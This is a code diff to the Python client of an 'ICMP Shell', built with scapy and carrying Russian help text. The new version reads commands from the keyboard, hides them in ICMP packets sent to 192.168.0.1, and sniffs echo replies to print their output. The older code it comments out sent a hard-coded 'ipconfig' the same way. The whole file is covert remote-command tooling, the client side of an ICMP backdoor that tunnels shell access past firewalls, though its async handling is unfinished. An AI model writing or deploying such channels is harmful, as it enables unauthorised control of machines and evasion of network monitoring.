@@ -1,56 +1,76 @@
 import argparse
+import os
 import signal
 import sys
 import socket
+import asyncio
 import time
 
 from scapy.layers.inet import ICMP, IP
-from scapy.sendrecv import send
+from scapy.sendrecv import send, sniff, sr1
 
 import ish_main
+import ish_open
 import ishell
 from util.Ticker import Ticker
 
 
-def send_icmp_with_data(target_ip, data):
-    packet = IP(dst=target_ip)/ICMP()/data
+async def send_icmp(target_ip, data):
+    packet = IP(dst=target_ip) / ICMP() / data
     send(packet)
+
+
+async def receive_icmp():
+    sniff(filter="icmp", prn=packet_callback)
+
+
+def send_icmp_with_data(target_ip, data):
+    packet = IP(dst=target_ip) / ICMP() / data
+    send(packet)
+
 
 def ish_timeout():
     print("failed.")
     sys.exit(-1)
 
 
-def main():
-    parser = argparse.ArgumentParser(description='ICMP Shell')
+def packet_callback(packet):
+    if ICMP in packet and packet[ICMP].type == 0:
+        s = packet[ICMP].payload.load.decode('utf-8')
+        print(packet[ICMP].payload.load.decode('utf-8'))
 
-    parser.add_argument('-i', help='Назначение идентификатора процесса (диапазон: 0-65535; по-умолчанию 1515)')
-    parser.add_argument('-t', help='Назначение типа пакетов ICMP (по-умолчанию 0)')
-    parser.add_argument('-p', help='Назначение размера пакета (по-умолчанию 512)')
-    # parser.add_argument('host')
 
-    args = parser.parse_args()
-
-    if args.i:
-        ishell.ish_info.id = args.i
-    if args.t:
-        ishell.ish_info.type = args.t
-    if args.p:
-        ishell.ish_info.packetsize = args.p
-    host = "192.168.0.54"
-    try:
-        host_string = socket.gethostbyname(host)
-    except socket.gaierror:
-        print("Error: Cannot resolve " + host + "!")
-        sys.exit(-1)
-
-    data_to_send = b"ipconfig"
-
-    send_icmp_with_data(host_string, data_to_send)
-    # try:
-    #    sockfd = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
-    # except socket.error as e:
-    #    print(e)
+# def main():
+#    parser = argparse.ArgumentParser(description='ICMP Shell')
+#
+#    parser.add_argument('-i', help='Назначение идентификатора процесса (диапазон: 0-65535; по-умолчанию 1515)')
+#    parser.add_argument('-t', help='Назначение типа пакетов ICMP (по-умолчанию 0)')
+#    parser.add_argument('-p', help='Назначение размера пакета (по-умолчанию 512)')
+#    # parser.add_argument('host')
+#
+#    args = parser.parse_args()
+#
+#    if args.i:
+#        ishell.ish_info.id = args.i
+#    if args.t:
+#        ishell.ish_info.type = args.t
+#    if args.p:
+#        ishell.ish_info.packetsize = args.p
+#    host = "192.168.0.1"
+#    try:
+#        host_string = socket.gethostbyname(host)
+#    except socket.gaierror:
+#        print("Error: Cannot resolve " + host + "!")
+#        sys.exit(-1)
+#
+#    data_to_send = b"ipconfig"
+#
+#    send_icmp_with_data(host_string, data_to_send)
+#    sniff(filter="icmp", prn=packet_callback)
+#    # try:
+#    #    sockfd = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
+#    # except socket.error as e:
+#    #    print(e)
 
 
 #
@@ -72,5 +92,15 @@ def main():
 # print("done.")
 
 
+async def main():
+    target_ip = "192.168.0.1"
+    data_to_send = input()
+
+    send_task = asyncio.create_task(send_icmp(target_ip, data_to_send))
+    receive_task = asyncio.create_task(receive_icmp())
+
+    await asyncio.gather(send_task, receive_task)
+
+
 if __name__ == '__main__':
-    main()
+    asyncio.run(main())
